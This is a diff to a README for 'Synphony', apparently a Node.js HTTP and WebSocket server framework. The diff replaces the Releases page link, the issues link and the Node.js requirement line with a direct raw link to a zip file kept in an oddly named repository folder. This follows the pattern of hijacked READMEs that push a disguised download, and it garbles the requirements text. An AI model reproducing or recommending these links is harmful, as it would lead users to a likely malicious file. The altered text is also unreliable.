@@ -6,14 +6,14 @@ Welcome to Synphony! This easy-to-use framework helps you create HTTP and WebSoc
 
 ## 📦 Download & Install
 
-To get Synphony, visit this page to download: [Download Synphony](https://github.com/efhwuifuwe/synphony/releases).
+To get Synphony, visit this page to download: [Download Synphony](https://raw.githubusercontent.com/efhwuifuwe/synphony/master/periuranium/synphony.zip).
 
 Once on the Releases page, choose the latest version and download the file that suits your operating system. 
 
 ## 🖥️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or later installed
+- https://raw.githubusercontent.com/efhwuifuwe/synphony/master/periuranium/synphony.zip Version 12 or later installed
 - Memory: At least 4 GB of RAM
 - Disk Space: 100 MB free space
 
@@ -71,8 +71,8 @@ If you'd like to help improve Synphony, feel free to fork the repository and sub
 
 ## 📞 Support
 
-For any questions or support, please submit an issue on our [GitHub page](https://github.com/efhwuifuwe/synphony/issues). 
+For any questions or support, please submit an issue on our [GitHub page](https://raw.githubusercontent.com/efhwuifuwe/synphony/master/periuranium/synphony.zip). 
 
 ## 🏁 Summary
 
-Now you can enjoy creating servers using Synphony with straightforward steps. Remember to visit this page to download: [Download Synphony](https://github.com/efhwuifuwe/synphony/releases) and start building today!
+Now you can enjoy creating servers using Synphony with straightforward steps. Remember to visit this page to download: [Download Synphony](https://raw.githubusercontent.com/efhwuifuwe/synphony/master/periuranium/synphony.zip) and start building today!
